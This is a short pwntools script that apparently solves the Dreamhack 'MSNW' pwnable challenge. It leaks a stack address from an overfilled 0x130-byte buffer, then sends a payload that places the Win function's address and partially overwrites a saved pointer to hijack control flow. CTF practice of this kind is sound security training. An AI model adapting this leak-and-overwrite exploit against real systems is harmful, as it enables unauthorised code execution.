from pwn import *

port = 13218
rem = remote("host3.dreamhack.games", port)

elf = ELF("./Pwnable/MSNW/problem/deploy/msnw")

win_addr = elf.symbols['Win']

payload = b'A' * 0x130
rem.sendafter(b": ", payload)
rem.recvuntil(payload)
buf_addr = u64(rem.recvn(6) + b'\x00' * 2) - 0x200 - 0x130

payload = b'A' * 8
payload += p64(win_addr)
payload += b'B' * (0x130 - len(payload))
payload += p64(buf_addr)[0:2]
rem.sendafter(b": ", payload)

print(rem.recvall())
